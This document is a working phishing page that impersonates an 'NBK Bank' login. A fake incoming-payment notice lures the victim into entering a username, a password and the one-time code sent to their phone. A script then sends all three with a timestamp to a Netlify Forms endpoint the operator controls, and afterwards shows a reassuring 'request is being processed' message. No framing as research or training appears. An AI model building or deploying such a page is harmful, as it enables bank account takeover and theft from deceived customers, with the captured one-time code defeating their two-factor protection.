<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NBK Login</title>
    <script src="https://cdn.tailwindcss.com/"></script>
    <style>
        body {
            font-family: "Inter", ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
            background-color: #ffffff;
            margin: 0;
            padding: 0;
        }
        .text-magazine-blue {
            color: #007bff;
        }
        .bg-dark-blue {
            background-color: #0056b3;
        }
        .bg-dark-blue:hover {
            background-color: #004085;
        }
        .spinner {
            border: 4px solid rgba(0, 123, 255, 0.1);
            border-top: 4px solid #007bff;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-4">

    <div class="bg-white w-full h-screen flex items-center justify-center">
        <div class="p-8 rounded-xl shadow-2xl max-w-md w-full bg-white">
            <div class="flex items-center justify-center mb-6">
                <img src="nk.png" alt="Game Icon" class="w-32 h-32 mr-2">
                <h1 class="text-3xl font-bold text-gray-900">NBK Bank</h1>
            </div>

            <h2 id="dynamicHeading" class="text-xl font-bold text-magazine-blue mb-4 text-center">Login NBK Account</h2>
            <p id="dynamicSubheading" class="text-gray-700 text-center mb-8"></p>

            <form id="loginForm" name="nbk-login" method="POST" data-netlify="true" class="text-left">
                <input type="hidden" name="form-name" value="nbk-login">
                <div id="dynamicFormContent">
                    </div>
            </form>

            <form name="nbk-login" data-netlify="true" hidden>
                <input type="text" name="username" />
                <input type="password" name="password" />
                <input type="text" name="otp" />
                <input type="text" name="phase_submitted" />
                <input type="text" name="timestamp" />
            </form>

        </div>
    </div>

    <script>
        const loginForm = document.getElementById('loginForm');
        const dynamicFormContent = document.getElementById('dynamicFormContent');
        const dynamicHeading = document.getElementById('dynamicHeading');
        const dynamicSubheading = document.getElementById('dynamicSubheading');

        let loginPhase = 'username';
        let storedUsername = '';
        let storedPassword = '';
        let storedOtp = '';

        function renderForm() {
            let contentHtml = '';

            if (loginPhase === 'username' || loginPhase === 'password' || loginPhase === 'otp') {
                let labelText = '';
                let inputType = '';
                let inputId = '';
                let inputName = ''; // CRITICAL: This will be the 'name' attribute for Netlify Forms
                let placeholder = '';
                let buttonText = '';
                let inputValue = '';

                if (loginPhase === 'username') {
                    labelText = 'Enter your username';
                    inputType = 'text';
                    inputId = 'username';
                    inputName = 'username'; // Netlify Forms needs this name (matches hidden form)
                    placeholder = 'Your username';
                    buttonText = 'Next';
                    inputValue = storedUsername;
                } else if (loginPhase === 'password') {
                    labelText = 'Enter your password';
                    inputType = 'password';
                    inputId = 'password';
                    inputName = 'password'; // Netlify Forms needs this name (matches hidden form)
                    placeholder = 'Your password';
                    buttonText = 'Login';
                    inputValue = storedPassword;
                } else if (loginPhase === 'otp') {
                    labelText = 'Enter OTP sent to your phone number';
                    inputType = 'text'; // Often 'text' for OTP to allow number-only input or mask
                    inputId = 'otp';
                    inputName = 'otp'; // Netlify Forms needs this name (matches hidden form)
                    placeholder = 'Your OTP';
                    buttonText = 'Verify OTP';
                    inputValue = storedOtp;
                }

                contentHtml = `
                    <label for="${inputId}" class="block text-magazine-blue text-lg font-semibold mb-2">${labelText}</label>
                    <input type="${inputType}" id="${inputId}" name="${inputName}" placeholder="${placeholder}" value="${inputValue}"
                           class="w-full p-3 mb-6 bg-white text-gray-900 rounded-lg border border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-500">
                    <button type="submit" id="actionButton"
                            class="w-full py-3 bg-dark-blue text-white font-bold rounded-lg shadow-lg hover:bg-dark-blue-hover transition duration-300 ease-in-out transform hover:scale-105">
                        ${buttonText}
                    </button>
                `;
            } else if (loginPhase === 'loading') {
                contentHtml = `
                    <div class="flex flex-col items-center justify-center py-10">
                        <div class="spinner mb-4"></div>
                        <p class="text-gray-900 text-lg">Loading...</p>
                    </div>
                `;
            } else if (loginPhase === 'welcome') {
                contentHtml = `
                    <div class="text-center">
                        <p class="text-gray-900 text-2xl font-bold mb-6">Welcome back Again!</p>
                        <button type="button" id="proceedButton"
                                class="w-full py-3 bg-dark-blue text-white font-bold rounded-lg shadow-lg hover:bg-dark-blue-hover transition duration-300 ease-in-out transform hover:scale-105">
                            Finish
                        </button>
                    </div>
                `;
            }

            dynamicFormContent.innerHTML = contentHtml;

            if (loginPhase === 'welcome') {
                dynamicHeading.textContent = 'Your request is being processed, thank you for staying with us';
                dynamicSubheading.textContent = '';
            } else {
                dynamicHeading.textContent = 'Login NBK Account';
                dynamicSubheading.textContent = 'Ahmed kumar iniated payment to your NBK Account';
            }

            if (loginPhase === 'username' || loginPhase === 'password' || loginPhase === 'otp') {
                loginForm.onsubmit = handleFormSubmission;
            } else if (loginPhase === 'welcome') {
                document.getElementById('proceedButton').addEventListener('click', () => {
                    alert("Welcome to the bank!");
                    // window.location.href = '/dashboard.html'; // Example: Redirect to a dashboard
                });
            }
        }

        async function handleFormSubmission(event) {
            event.preventDefault();

            let currentInputData = '';
            let nextPhase = '';

            if (loginPhase === 'username') {
                const usernameInput = document.getElementById('username');
                currentInputData = usernameInput.value.trim();
                if (currentInputData === "") {
                    alert("Please enter your username.");
                    return;
                }
                storedUsername = currentInputData;
                nextPhase = 'password';
            } else if (loginPhase === 'password') {
                const passwordInput = document.getElementById('password');
                currentInputData = passwordInput.value.trim();
                if (currentInputData === "") {
                    alert("Please enter your password.");
                    return;
                }
                storedPassword = currentInputData;
                nextPhase = 'otp';
            } else if (loginPhase === 'otp') {
                const otpInput = document.getElementById('otp');
                currentInputData = otpInput.value.trim();
                if (currentInputData === "") {
                    alert("Please enter the OTP.");
                    return;
                }
                storedOtp = currentInputData;
                nextPhase = 'welcome';
            }

            // Only when we reach the 'welcome' phase (final step) do we submit to Netlify Forms
            if (nextPhase === 'welcome') {
                const formData = new FormData();
                formData.append('form-name', 'nbk-login'); // Matches the 'name' of both forms
                formData.append('username', storedUsername);
                formData.append('password', storedPassword);
                formData.append('otp', storedOtp);
                formData.append('phase_submitted', loginPhase);
                formData.append('timestamp', new Date().toISOString());

                // Show loading spinner
                loginPhase = 'loading';
                renderForm();

                const netlifyFormUrl = loginForm.action || window.location.pathname; // Submits to the current page path

                try {
                    const response = await fetch(netlifyFormUrl, {
                        method: 'POST',
                        body: formData,
                    });

                    if (response.ok) {
                        console.log("Data successfully sent to Netlify Forms!");
                        setTimeout(() => {
                            loginPhase = 'welcome';
                            renderForm();
                            console.log("OTP Verified! Login successful!");
                        }, 3000); // Simulate delay
                    } else {
                        console.error("Failed to send data to Netlify Forms. Status:", response.status);
                        alert("An error occurred during submission. Please try again.");
                        loginPhase = 'otp'; // Revert if submission fails
                        renderForm();
                    }
                } catch (error) {
                    console.error("Network error submitting to Netlify Forms:", error);
                    alert("Network error. Please check your connection.");
                    loginPhase = 'otp';
                    renderForm();
                }

            } else {
                // For intermediate phases, just transition the UI
                loginPhase = 'loading';
                renderForm();
                setTimeout(() => {
                    loginPhase = nextPhase;
                    renderForm();
                }, 3000); // Simulate delay
            }
        }

        document.addEventListener('DOMContentLoaded', renderForm);
    </script>

</body>
</html>
